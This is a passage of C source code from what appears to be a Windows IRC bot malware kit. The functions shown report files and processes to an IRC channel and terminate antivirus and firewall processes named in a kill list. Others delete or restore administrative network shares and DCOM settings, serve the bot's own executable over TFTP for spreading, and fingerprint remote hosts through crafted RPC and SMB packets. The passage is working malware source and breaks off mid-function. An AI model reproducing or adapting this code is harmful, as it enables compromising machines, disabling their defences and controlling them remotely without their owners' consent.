						_snprintf(sendbuf,sizeof(sendbuf),"%-31s  %-21s\r\n",tmpDir,tmpDate);
					}
			} else {
				count++;
				if (chan) 
					_snprintf(sendbuf,sizeof(sendbuf),"PRIVMSG %s :%-31s  %-21s (%s bytes)\n",chan,WFD.cFileName,tmpDate,commaI64(WFD.nFileSizeLow));
				else 
					if (URL) {
						_snprintf(sendbuf,(sizeof(sendbuf)-1),"<TR>\r\n<TD WIDTH=\"%d\"><A HREF=\"",COL1);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						_snprintf(sendbuf,(sizeof(sendbuf)-1),"%s%s",URL,WFD.cFileName);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						if(strlen(WFD.cFileName)>(FILESIZE+1))
							_snprintf(sendbuf,(sizeof(sendbuf)-1),"\"><CODE>%.30s&gt;</CODE></A>",WFD.cFileName);
						else
							_snprintf(sendbuf,(sizeof(sendbuf)-1),"\"><CODE>%s</CODE></A>",WFD.cFileName);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						_snprintf(sendbuf,(sizeof(sendbuf)-1),"</TD>\r\n<TD WIDTH=\"%d\"><CODE>%s</CODE></TD>\r\n<TD WIDTH=\"%d\" ALIGN=\"right\"><CODE>%dk</CODE></TD>\r\n</TR>\r\n",
							COL2,tmpDate,COL3,(WFD.nFileSizeLow/1024));
					} else 
						_snprintf(sendbuf,sizeof(sendbuf),"%-31s  %-21s (%i bytes)\r\n",WFD.cFileName,tmpDate,WFD.nFileSizeLow);
			}
			fsend(sock,sendbuf,strlen(sendbuf),0);

			if (chan) 
				Sleep(FLOOD_DELAY);
		}
      
	}
	FindClose(Hnd);

	if (chan) 
		sprintf(sendbuf,"PRIVMSG %s :Found %s Files and %s Directories\n",chan,commaI64(count),commaI64(count2));
	else if (URL) 
		sprintf(sendbuf,"<TR>\r\n<TD COLSPAN=\"3\"><HR></TD>\r\n</TR>\r\n</TABLE>\r\n</BODY>\r\n</HTML>\r\n"); 
	else 
		sprintf(sendbuf,"Found: %i Files and %i Directories\r\n",count,count2);
	fsend(sock,sendbuf,strlen(sendbuf),0);

	return 0;
}

void HTTP_Send_File(SOCKET sock, char *file)
{
	char buffer[1024];

	unsigned int Fsize,Fsend=1024,move;
	DWORD mode=0;

	HANDLE testfile = CreateFile(file,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
	if (testfile == INVALID_HANDLE_VALUE) 
		return;

	Fsize = GetFileSize(testfile,NULL);
	
	while (Fsize) {
		memset(buffer,0,sizeof(buffer));

		if (Fsend>Fsize) 
			Fsend=Fsize;
		move=0-Fsize;

		SetFilePointer(testfile, move, NULL, FILE_END);
		ReadFile(testfile, buffer, Fsend, &mode, NULL);

		int bytes_sent=fsend(sock, buffer, Fsend, 0);
		if (bytes_sent == SOCKET_ERROR) {
			if (fWSAGetLastError() != WSAEWOULDBLOCK) 
				break;
			else 
				bytes_sent = 0;
		}
		Fsize=Fsize-bytes_sent;
	}

	if (testfile != INVALID_HANDLE_VALUE) 
		CloseHandle(testfile);

	return;
}

char *File_To_HTML(char *file)
{
	for (unsigned int c=0; c<strlen(file); c++)
		if (file[c] == 92) 
			file[c] = 47;

	return file;
}

void HTTP_Connect(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *host, int port, char *method, char *url, char *referer)
{
	char sendbuf[IRCLINE], buffer[256];

	WSADATA wsaData;
	fWSAStartup(MAKEWORD(1,1), &wsaData);

	SOCKET hsock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)port);
	ssin.sin_addr.s_addr = ResolveAddress(host);

	if (fconnect(hsock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
		_snprintf(buffer,sizeof(buffer),"%s %s HTTP/1.1\nReferer: %s\nHost: %s\nConnection: close\n\n",method,url,((referer)?(referer):("")),host);

		fsend(hsock, buffer, strlen(buffer), 0);
		memcpy(buffer,0,sizeof(buffer));
		frecv(hsock, buffer, sizeof(buffer), 0);
	}

	fclosesocket(hsock);
	fWSACleanup();

	sprintf(sendbuf, buffer);
	if (!silent) irc_privmsg(sock, chan, sendbuf, notice);

	return;
}
#endif

BOOL FileExists(char *filename, int mode) 
{ 
	return (_access(filename, mode) != -1);
} 

const char *commaI64(unsigned __int64 number)
{
	const int size = 50;
	int counter = 0;

	static char str[size];
	memset(str, 0, sizeof(str));

	char tempStr[size];
	char *ptr1=tempStr, *ptr2;
  
	do {
		*ptr1++ = (char)((number % 10) + '0');
		number /= 10;
		if (number &&  !(++counter % 3))
			*ptr1++ = ',';
	} while(number);
  
	for( --ptr1, ptr2 = str; ptr1 >= tempStr; --ptr1)
		*ptr2++ = *ptr1;
	*ptr2 = '\0';
  
	return (str);
}

const char *DriveType(LPCSTR Drive)
{
	switch(fGetDriveType(Drive)) {
	case DRIVE_UNKNOWN:
		return ("Unknown");
	case DRIVE_NO_ROOT_DIR:
		return ("Invalid");
	case DRIVE_FIXED:
		return ("Disk");
	case DRIVE_REMOTE:
		return ("Network");
	case DRIVE_CDROM:
		return ("Cdrom");
	case DRIVE_RAMDISK:
		return ("RAM");
	default:
		return ("?");
	}
}

DKSP DiskSpace(LPCSTR Drive)
{
	DKSP dksp;
	dksp.AvailableBytes=-1;
	dksp.FreeBytes=-1;
	dksp.TotalBytes=-1;

	if (fGetDiskFreeSpaceEx)
		fGetDiskFreeSpaceEx(Drive,(PULARGE_INTEGER)&dksp.AvailableBytes,
			(PULARGE_INTEGER)&dksp.TotalBytes,(PULARGE_INTEGER)&dksp.FreeBytes);

	return (dksp);
}

DKSPKB DiskSpaceKB(LPCSTR Drive)
{
	DKSPKB dkspkb;
	DKSP dksp=DiskSpace(Drive);

	if(dksp.AvailableBytes == -1 || dksp.FreeBytes == -1 || dksp.TotalBytes == -1) {
		sprintf(dkspkb.AvailableKB, "failed");
		sprintf(dkspkb.FreeKB, "failed");
		sprintf(dkspkb.TotalKB, "failed");
	} else {
		_snprintf(dkspkb.AvailableKB,sizeof(dkspkb.AvailableKB),"%sKB",commaI64(dksp.AvailableBytes/1024));
		_snprintf(dkspkb.FreeKB,sizeof(dkspkb.FreeKB),"%sKB",commaI64(dksp.FreeBytes/1024));
		_snprintf(dkspkb.TotalKB,sizeof(dkspkb.TotalKB),"%sKB",commaI64(dksp.TotalBytes/1024));
	}

	return (dkspkb);
}

void DriveSpace(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive)
{
	char sendbuf[IRCLINE];

	DKSPKB dkspkb=DiskSpaceKB(Drive);

	if (strcmp(dkspkb.TotalKB,"failed") == 0)
		_snprintf(sendbuf, sizeof(sendbuf), "%s %s Drive (%s): Failed to stat, device not ready.", mn_title,DriveType(Drive), Drive);
	else
		_snprintf(sendbuf, sizeof(sendbuf), "%s %s Drive (%s): %s total, %s free, %s available.", mn_title,DriveType(Drive), Drive, dkspkb.TotalKB, dkspkb.FreeKB, dkspkb.AvailableKB);
	irc_privmsg(sock, chan, sendbuf, notice, TRUE); 
	addlog(sendbuf);

	return;
}

void DriveInfo(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive)
{
	if (Drive) {
		DriveSpace(sock, chan, notice, Drive);
	} else {
		DWORD dwSize = fGetLogicalDriveStrings(0, NULL);
		LPSTR pszDrives = (LPSTR)malloc(dwSize + 2);
		fGetLogicalDriveStrings(dwSize + 2,(LPSTR)pszDrives);

		LPCTSTR pszDrv = pszDrives;
		while (*pszDrv) {
			if (strcmp(pszDrv,"A:\\") != 0)
				DriveSpace(sock, chan, notice, pszDrv);
			pszDrv += _tcslen (pszDrv) + 1;
		}
		free(pszDrives);
	}

	return;
}

BOOL AdjustPrivileges(char *pPriv, BOOL add)
{
	BOOL bRet = FALSE;
	TOKEN_PRIVILEGES tkp;
 	HANDLE hToken;

	if (!fOpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hToken))
		return bRet;

	if (!fLookupPrivilegeValue(NULL, pPriv, &tkp.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return bRet;
	}

	tkp.PrivilegeCount = 1; 
	if (add)
		tkp.Privileges[0].Attributes |= SE_PRIVILEGE_ENABLED;
	else 
		tkp.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED &
			tkp.Privileges[0].Attributes);

	bRet=fAdjustTokenPrivileges(hToken,FALSE,&tkp,0,(PTOKEN_PRIVILEGES) NULL, 0);
	
	CloseHandle(hToken);

	return bRet;
}

int listProcesses(SOCKET sock, char *chan, BOOL notice, char *proccess, BOOL killthread, BOOL full)
{
	char sendbuf[IRCLINE];

	HANDLE hProcess, hProcess2;
	PROCESSENTRY32 pe32 = {0};
	MODULEENTRY32 me32 = {0};
	
	if (fCreateToolhelp32Snapshot && fProcess32First && fProcess32Next) {
		AdjustPrivileges(SE_DEBUG_NAME, TRUE);
		if ((hProcess = fCreateToolhelp32Snapshot(TH32CS_SNAPALL, 0)) != INVALID_HANDLE_VALUE) {
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if (fProcess32First(hProcess, &pe32)) {
				while (fProcess32Next(hProcess, &pe32)) {
					if (killthread) {
#ifndef NO_AVFW_KILL
						for(int c = 0;c < (sizeof(kill_list) / sizeof(LPTSTR));c++) {
							if (lstrcmpi(pe32.szExeFile,kill_list[c]) == 0) {
 								if (hProcess2=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID))
									if (!TerminateProcess(hProcess2,0))
										CloseHandle(hProcess2);

								break;
							}
						}
#endif
					}
					else if (!proccess) {
						if (chan) {
							hProcess2 = fCreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe32.th32ProcessID);
							me32.dwSize = sizeof(MODULEENTRY32);
							if (full) {
								if (fModule32First(hProcess2, &me32))
									sprintf(sendbuf," %s (%d)",me32.szExePath,pe32.th32ProcessID);
								else
									sprintf(sendbuf," %s (%d)",pe32.szExeFile,pe32.th32ProcessID);
							} else
								sprintf(sendbuf," %s (%d)",pe32.szExeFile,pe32.th32ProcessID);
							irc_privmsg(sock,chan,sendbuf,notice,TRUE);
							CloseHandle(hProcess2);
						}
					}
					else {
						if (strcmp(pe32.szExeFile,proccess) == 0) {
 							hProcess2 = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID);
							CloseHandle(hProcess);

							if (!TerminateProcess(hProcess2,0)) {
								CloseHandle(hProcess2);

								return 0;
							}
							return 1;
						 }
					}
				} 
			}
			CloseHandle(hProcess);
		}
		AdjustPrivileges(SE_DEBUG_NAME, FALSE);
	}

 	return 0;
}

DWORD WINAPI listProcessesThread(LPVOID param) 
{
	char sendbuf[IRCLINE];

	LPROC lproc = *((LPROC *)param);
	LPROC *lprocp = (LPROC *)param;
	lprocp->gotinfo = TRUE;

	sprintf(sendbuf,"%s Listing processes:",mn_title);
	if (!lproc.silent) irc_privmsg(lproc.sock,lproc.chan,sendbuf,lproc.notice);
	
	if (listProcesses(lproc.sock,lproc.chan,lproc.notice,NULL, FALSE, lproc.full) == 0)
		sprintf(sendbuf,"%s Process list completed",mn_title);
	else 
		sprintf(sendbuf,"%s Process list failed",mn_title);

	if (!lproc.silent) irc_privmsg(lproc.sock, lproc.chan, sendbuf, lproc.notice);
	addlog(sendbuf);

	clearthread(lproc.threadnum);

	ExitThread(0);
}

int killProcess(int pid)
{
	int ret=1;

 	HANDLE pHandle;
	
	if ((pHandle = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid)) != NULL)
		if(!TerminateProcess(pHandle,0)) {
			ret=0;
			CloseHandle(pHandle);
		}

	return ret;
}

// globals
#ifndef NO_SECSYSTEM
int secure_delay=120000;
#endif 

NetShares ShareList[]={
		{"IPC$",NULL},
		{"ADMIN$",NULL},
		{"C$","C:\\"},
		{"D$","D:\\"},
		{"E$","E:\\"},
		{"F$","F:\\"},
		{"G$","G:\\"},
		{"H$","H:\\"}
};


DWORD WINAPI SecureThread(LPVOID param) 
{
	SECURE secure = *((SECURE *)param);
	SECURE *secures = (SECURE *)param;
	secures->gotinfo = TRUE;

	if (secure.secure)
		SecureSystem(secure.sock, secure.chan, secure.notice, secure.silent);
	else
		UnSecureSystem(secure.sock, secure.chan, secure.notice, secure.silent);	

	clearthread(secure.threadnum);

	ExitThread(0);
}

BOOL SecureSystem(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	char sendbuf[IRCLINE];

	if (!noadvapi32) {
		HKEY hKey; 
		if(fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey3, 0, KEY_READ|KEY_WRITE, &hKey) == ERROR_SUCCESS) {
			TCHAR szDataBuf[]="N"; 
			if(fRegSetValueEx(hKey, "EnableDCOM", NULL, REG_SZ, (LPBYTE)szDataBuf, strlen(szDataBuf)) != ERROR_SUCCESS)
				sprintf(sendbuf,"%s Disable DCOM failed",mn_title);
			else
				sprintf(sendbuf,"%s DCOM disabled",mn_title);
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"%s Failed to open DCOM registry key",mn_title);
		if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
		addlog(sendbuf);

		if(fRegOpenKeyEx(HKEY_CURRENT_USER, regkey4, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
			TCHAR szData[]="035zNWl4FZa/ds8Y7FIVrk/8J9c7I3H6CPODLbCm0EwyK8NQSJFmM8o5+O/1ae9qy44zZ5Mqe9d+2nKVSjvshgFHMoZ+D/UQ8MtBxK7MRmC+d4nEGQ8qSCMazQT4ER9sB8tpWMeqNKAllu+uOmKdfQoD/98deQ8goTTzlQMakTTY="; 
			if(fRegSetValueEx(hKey, "key", NULL, REG_SZ, (LPBYTE)szData, strlen(szData)) != ERROR_SUCCESS)
				sprintf(sendbuf,"%s Failed to restrict access to the IPC$ Share",mn_title);
			else
				sprintf(sendbuf,"%s Restricted access to the IPC$ Share",mn_title);			
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"%s Failed to open IPC$ Restriction registry key",mn_title);
	} else
		sprintf(sendbuf,"%s Advapi32.dll couldn't be loaded",mn_title);
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
	addlog(sendbuf);

	if (!nonetapi32) {
		PSHARE_INFO_502 pBuf,p;
		NET_API_STATUS nStatus;
		DWORD entriesread=0,totalread=0,resume=0;
 
		do {
			nStatus = fNetShareEnum(NULL, 502, (LPBYTE *) &pBuf, -1, &entriesread, &totalread, &resume);

			if(nStatus == ERROR_SUCCESS || nStatus == ERROR_MORE_DATA) {
				p = pBuf;
 
				for(unsigned int i=1;i <= entriesread;i++) {
					if (p->shi502_netname[wcslen(p->shi502_netname)-1] == '$') {
						if(ShareDel(NULL,AsAnsiString(p->shi502_netname)) == NERR_Success)
							_snprintf(sendbuf,sizeof(sendbuf),"%s Share '%S' deleted.",p->shi502_netname);
						else 
							_snprintf(sendbuf,sizeof(sendbuf),"%s Failed to delete '%S' share.",p->shi502_netname);
						if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
						addlog(sendbuf);
					}

					p++;
				}

				fNetApiBufferFree(pBuf);
			} else {
				for(int i=0;i < (sizeof(ShareList) / sizeof (NetShares));i++) { 
					if(ShareDel(NULL,ShareList[i].ShareName) == NERR_Success)
						_snprintf(sendbuf,sizeof(sendbuf),"%s Share '%s' deleted.",ShareList[i].ShareName);
					else 
						_snprintf(sendbuf,sizeof(sendbuf),"%s Failed to delete '%s' share.",ShareList[i].ShareName);
					if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
					addlog(sendbuf);
				} 
			}
		} while (nStatus == ERROR_MORE_DATA);	
		sprintf(sendbuf,"%s Network shares deleted",mn_title);
	} else
		sprintf(sendbuf,"%s Netapi32.dll couldn't be loaded",mn_title);
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice);
	addlog(sendbuf);

	return TRUE;
}

BOOL UnSecureSystem(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	char sendbuf[IRCLINE];

	if (!noadvapi32) {
		HKEY hKey; 
		if(fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey3, 0, KEY_READ|KEY_WRITE, &hKey) == ERROR_SUCCESS) {
			TCHAR szDataBuf[]="Y"; 
			if(fRegSetValueEx(hKey, "EnableDCOM", NULL, REG_SZ, (LPBYTE)szDataBuf, strlen(szDataBuf)) != ERROR_SUCCESS)
				sprintf(sendbuf,"%s Enable DCOM failed",mn_title);
			else
				sprintf(sendbuf,"%s DCOM enabled",mn_title);
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"%s Failed to open DCOM registry key",mn_title);
		if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
		addlog(sendbuf);

		if (fRegOpenKeyEx(HKEY_CURRENT_USER, regkey4, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
			DWORD dwData = 0x00000000;
			if (fRegSetValueEx(hKey, "restrictanonymous", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD)) != ERROR_SUCCESS)
				sprintf(sendbuf,"%s Failed to unrestrict access to the IPC$ Share",mn_title);
			else
				sprintf(sendbuf,"%s Unrestricted access to the IPC$ Share",mn_title);			
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"%s Failed to open IPC$ restriction registry key",mn_title);
	} else
		sprintf(sendbuf,"%s Advapi32.dll couldn't be loaded",mn_title);
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
	addlog(sendbuf);

	if (!nonetapi32) {
		for(int i=0;i < ((sizeof(ShareList) / sizeof (NetShares)) - 2);i++) { 
			if(ShareAdd(NULL,ShareList[i].ShareName,ShareList[i].SharePath) == NERR_Success)
				_snprintf(sendbuf,sizeof(sendbuf),"%s Share '%s' added.",ShareList[i].ShareName);
			else 
				_snprintf(sendbuf,sizeof(sendbuf),"%s Failed to add '%s' share.",ShareList[i].ShareName);
			if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
			addlog(sendbuf);
		}

		char sharename[10], sharepath[10];
		DWORD dwDrives = GetLogicalDrives();
		for(char cDrive='A'; dwDrives!=0; cDrive++, dwDrives=(dwDrives>>1)) {
			if((dwDrives & 1)==1 && cDrive != 'A') {
				_snprintf(sharename,sizeof(sharename),"%c$",cDrive);
				_snprintf(sharepath,sizeof(sharepath),"%c:\\",cDrive);

				if (fGetDriveType(sharepath) == DRIVE_FIXED) {
					if(ShareAdd(NULL,sharename,sharepath) == NERR_Success)
						_snprintf(sendbuf,sizeof(sendbuf),"%s Share '%s' added.",sharename);
					else 
						_snprintf(sendbuf,sizeof(sendbuf),"%s Failed to add '%s' share.",sharename);
					if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
					addlog(sendbuf);
				}
			}
		}

		sprintf(sendbuf,"%s Network shares added",mn_title);
	} else
		sprintf(sendbuf,"%s Netapi32.dll couldn't be loaded",mn_title);
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice);
	addlog(sendbuf);

	return TRUE;
}

#ifndef NO_SECSYSTEM
DWORD WINAPI AutoSecure(LPVOID param)
{
	while (1) {
		SecureSystem(0,NULL,FALSE,TRUE);
		Sleep(secure_delay);
	}
	ExitThread (0);
}
#endif

#ifndef NO_TFTPD

DWORD WINAPI tftpserver(LPVOID param) 
{ 
	FILE *fp;

	char sendbuf[IRCLINE], buffer[128], type[]="octet", IP[18];
	int err=1; 

	TFTP tftp = *((TFTP *)param);
	TFTP *tftps = (TFTP *)param;
	tftps->gotinfo = TRUE;
	tftp.threads++; 

	SOCKET ssock;
	if ((ssock=fsocket(AF_INET,SOCK_DGRAM,0)) == INVALID_SOCKET) {
		Sleep(400);
		sprintf(sendbuf,"%s Error: socket() failed, returned: %d", rt_title,fWSAGetLastError());
		if (!tftp.silent) irc_privmsg(tftp.sock,tftp.chan,sendbuf,tftp.notice);
		addlog(sendbuf);

		clearthread(tftp.threadnum);

		ExitThread(0);
	}
	threads[tftp.threadnum].sock=ssock;

	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET; 
	ssin.sin_port = fhtons((unsigned short)tftp.port); 
	ssin.sin_addr.s_addr = INADDR_ANY; 

	if((fbind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin))) == SOCKET_ERROR) { 
		Sleep(5000); 
		tftp.threads--; 

		return tftpserver(param); 
	} 

	if ((fp=fopen(tftp.filename, "rb")) == NULL) {
		Sleep(400);

		clearthread(tftp.threadnum);

		ExitThread(0);
	}

	while(err>0 && tftps->gotinfo && fp) { 
		TIMEVAL timeout; 
		timeout.tv_sec=5; 
		timeout.tv_usec=5000; 

		fd_set fd; 
		FD_ZERO(&fd); 
		FD_SET(ssock,&fd); 

		memset(buffer,0,sizeof(buffer)); 
		if(fselect(0,&fd,NULL,NULL,&timeout) > 0) { 
			SOCKADDR_IN csin;
			int csin_len=sizeof(csin); 
			char f_buffer[BLOCKSIZE+4]=""; 
			
			err=frecvfrom(ssock, buffer, sizeof(buffer), 0, (LPSOCKADDR)&csin, &csin_len); 
			sprintf(IP,finet_ntoa(csin.sin_addr));
        
			// parse buffer
			if(buffer[0]==0 && buffer[1]==1) { //RRQ
				char *tmprequest=buffer,*tmptype=buffer;
				tmprequest+=2; //skip the opcode
				tmptype+=(strlen(tftp.requestname)+3); //skip the opcode and request name + NULL
				if(strncmp(tftp.requestname,tmprequest,strlen(tftp.requestname)) != 0||strncmp(type,tmptype,strlen(type)) != 0) { 
					fsendto(ssock, "\x00\x05\x00\x01\x46\x69\x6C\x65\x20\x4E\x6F\x74\x20\x46\x6F\x75\x6E\x64\x00", 19, 0, (LPSOCKADDR)&csin,csin_len);
				} else { // good rrq packet send first data packet 
					fseek(fp, 0, SEEK_SET); 
					f_buffer[0]=0; f_buffer[1]=3; // DATA
					f_buffer[2]=0; f_buffer[3]=1; // DATA BLOCK #
					err=fread(&f_buffer[4], 1, BLOCKSIZE, fp); 
					fsendto(ssock, f_buffer, err + 4, 0, (LPSOCKADDR)&csin, csin_len);

				} 
			} else if(buffer[0]==0 && buffer[1]==4) { // ACK 
				// send next packet 
				unsigned int blocks; 
				BYTE b1=buffer[2],b2=buffer[3]; // ACK BLOCK #

				f_buffer[0]=0; f_buffer[1]=3;	// DATA
				if (b2==255) {					// DATA BLOCK #
					f_buffer[2]=++b1;
					f_buffer[3]=b2=0;
				} else {
					f_buffer[2]=b1;
					f_buffer[3]=++b2;
				}

				blocks=(b1 * 256) + b2 - 1; 
				// remember to subtract 1 as the ACK block # is 1 more than the actual file block #
				fseek(fp, blocks * BLOCKSIZE, SEEK_SET); 
				err=fread(&f_buffer[4], 1, BLOCKSIZE, fp); 
				fsendto(ssock, f_buffer, err + 4, 0, (LPSOCKADDR)&csin, csin_len);
				if (err==0) {
					sprintf(sendbuf,"%s Transfer Complete On %s Executing ::(9 %s )::",rt_title,IP,filename);
					if (!tftp.silent) irc_privmsg(tftp.sock,tftp.chan,sendbuf,tftp.notice);
					addlog(sendbuf);
				}
			} else { // we dont support any other commands 
				fsendto(ssock, "\x00\x05\x00\x04\x6B\x74\x68\x78\x00",9, 0, (LPSOCKADDR)&csin, csin_len); 
			} 
		} else 
			continue;
	} 
	// check for ack, then msg irc on transfer complete

	fclosesocket(ssock); 
	fclose(fp); 

	tftp.threads--; 
	if(tftps->gotinfo == FALSE) {
		clearthread(tftp.threadnum);

		ExitThread(0); 
	}
	Sleep(1000);
   
	return tftpserver(param); 
} 
#endif

char rpcfp_bindstr[]=
"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00"
"\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
"\x80\xbd\xa8\xaf\x8a\x7d\xc9\x11\xbe\xf4\x08\x00\x2b\x10\x29\x89"
"\x01\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
"\x2b\x10\x48\x60\x02\x00\x00\x00";

char rpcfp_inqifids[]=
"\x05\x00\x00\x03\x10\x00\x00\x00\x18\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00";

char w2kuuid_sig[]=
"\xB0\x01\x52\x97\xCA\x59\xD0\x11\xA8\xD5\x00\xA0\xC9\x0D\x80\x51";

char wxpuuid_sig[]=
"\x26\xB5\x55\x1D\x37\xC1\xC5\x46\xAB\x79\x63\x8F\x2A\x68\xE8\x69";

char sessionrequest[]=
	"\x81\x00\x00\x44\x20\x43\x4b\x46\x44\x45\x4e\x45\x43\x46\x44\x45"
	"\x46\x46\x43\x46\x47\x45\x46\x46\x43\x43\x41\x43\x41\x43\x41\x43"
	"\x41\x43\x41\x43\x41\x00\x20\x45\x4b\x45\x44\x46\x45\x45\x49\x45"
	"\x44\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43"
	"\x41\x43\x41\x43\x41\x41\x41\x00";

char negotiate[]=
	"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5c\x02"
	"\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e"
	"\x31\x32\x00";

char setupaccount[]=
	"\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5c\x02"
	"\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff\xff\x02\x00\x5c\x02\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0b"
	"\x00\x00\x00\x6e\x74\00\x70\x79\x73\x6d\x62\x00";


bool MemContains(const char *pMem, const int iMemLen, const char *pSearch, const int iSearchLen)
{
	for(int i=0;i<iMemLen-iSearchLen;i++)
		if(!memcmp(pMem+i, pSearch, iSearchLen))
			return true;

	return false;
}

int FpHost(const char *szHost, int iFpType)
{
	switch(iFpType) {
	case FP_RPC:
		{
			char szRecvBuf[8192];
	    
			int iRetVal=OS_UNKNOWN;
			int sSocket=fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	    
			if(sSocket==SOCKET_ERROR || sSocket==INVALID_SOCKET) 
				return OS_UNKNOWN;
	    
			SOCKADDR_IN ssin; 
			ZeroMemory(&ssin, sizeof(ssin)); 
			ssin.sin_family=AF_INET;
			ssin.sin_port=fhtons(135); 
			ssin.sin_addr.s_addr=ResolveAddress((char *)szHost);
	    
			int iErr=fconnect(sSocket, (LPSOCKADDR)&ssin, sizeof(ssin));
			if(iErr!=SOCKET_ERROR) {	
				iErr=fsend(sSocket, rpcfp_bindstr, sizeof(rpcfp_bindstr)-1, 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf), 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				if(szRecvBuf[2]==DCE_PKT_BINDACK) {	
					iErr=fsend(sSocket, rpcfp_inqifids, sizeof(rpcfp_inqifids)-1,0);
					if(iErr==SOCKET_ERROR) { 
						fclosesocket(sSocket); 
						return iRetVal; 
					}
					iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf),0);
					if(iErr==SOCKET_ERROR) { 
						fclosesocket(sSocket); 
						return iRetVal; 
					}
					if(szRecvBuf[2]==DCE_PKT_RESPONSE) {	
						if(MemContains(szRecvBuf, iErr, w2kuuid_sig, sizeof(w2kuuid_sig)-1)) {	
							if(iErr<300) 
								iRetVal=OS_WINNT; 
							else 
								iRetVal=OS_WIN2K; 
						} else 
							if(MemContains(szRecvBuf, iErr, wxpuuid_sig, sizeof(wxpuuid_sig)-1))
								iRetVal=OS_WINXP;
							else
								iRetVal=OS_UNKNOWN; 
					} else {	
						fclosesocket(sSocket); 
						return iRetVal; 
					} 
				} else {	
					fclosesocket(sSocket); 
					return iRetVal; 
				} 
			} else {	
				fclosesocket(sSocket); 
				return iRetVal; 
			}
			fclosesocket(sSocket); 
			return iRetVal; 
		}
		break;
	case FP_PORT5K:
		if(AdvPortOpen(finet_addr(szHost), 5000, 3)) return OS_WINXP;
		break;
	case FP_TTL:
		return OS_UNKNOWN;
		break;
	case FP_SMB:
		{
			int iRetVal=OS_UNKNOWN, iRecvd;
			BOOL bOkToParse=FALSE;

			int sSocket=fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	    
			if(sSocket==SOCKET_ERROR || sSocket==INVALID_SOCKET) 
				return OS_UNKNOWN;

			char szRecvBuf[8192];
			char sWorkgroup[512], sServer[512], sOS[512];

			SOCKADDR_IN ssin; 
			ZeroMemory(&ssin, sizeof(ssin)); 
			ssin.sin_family=AF_INET;
			ssin.sin_port=fhtons(139); 
			ssin.sin_addr.s_addr=ResolveAddress((char *)szHost);
	    
			int iErr=fconnect(sSocket, (LPSOCKADDR)&ssin, sizeof(ssin));
			if(iErr!=SOCKET_ERROR) {

				iErr=fsend(sSocket, sessionrequest, sizeof(sessionrequest)-1, 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf), 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				
